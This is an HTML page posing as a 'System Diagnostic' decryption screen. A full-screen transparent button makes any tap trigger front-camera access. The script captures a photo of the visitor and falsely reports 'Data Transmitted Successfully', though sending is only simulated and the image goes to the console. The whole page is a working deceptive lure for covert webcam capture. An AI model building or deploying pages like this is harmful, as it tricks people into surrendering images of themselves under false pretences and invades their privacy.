<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Latar belakang animasi Matrix-like */
        #bg-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0.3;
        }

        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            border: 1px solid #00ff00;
            padding: 40px;
            box-shadow: 0 0 20px #00ff00;
            background: rgba(0, 20, 0, 0.8);
        }

        /* Tombol transparan yang menutupi seluruh layar */
        #trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            cursor: pointer;
            z-index: 100;
        }

        .scanning-text {
            font-size: 1.5rem;
            text-transform: uppercase;
            letter-spacing: 5px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }

        video, canvas { display: none; }
        
        #status {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #888;
        }
    </style>
</head>
<body>

    <div id="bg-effect"></div>

    <button id="trigger"></button>

    <div class="container">
        <div class="scanning-text">INITIALIZING SYSTEM...</div>
        <p>Tap anywhere to start decryption</p>
        <div id="status">Secure Connection: Pending...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const trigger = document.getElementById('trigger');
        const statusText = document.getElementById('status');

        // Fungsi Ambil Foto
        async function startCapture() {
            try {
                statusText.innerText = "Accessing Neural Link...";
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                // Tunggu sebentar agar hardware kamera siap
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Simpan data foto
                    const data = canvas.toDataURL('image/png');
                    
                    // Simulasi pengiriman data
                    statusText.innerText = "Data Transmitted Successfully.";
                    console.log("Captured image data:", data);

                    // Matikan kamera lagi
                    stream.getTracks().forEach(track => track.stop());
                    
                    alert("System Analysis Complete. Photo Captured.");
                    
                    // Menghilangkan tombol pemicu agar tidak klik dua kali
                    trigger.style.display = 'none';
                }, 1000);

            } catch (err) {
                console.error(err);
                statusText.innerText = "Error: Access Denied by User.";
            }
        }

        // Jalankan saat layar diklik (memenuhi syarat User Gesture)
        trigger.addEventListener('click', startCapture);
    </script>
</body>
</html>
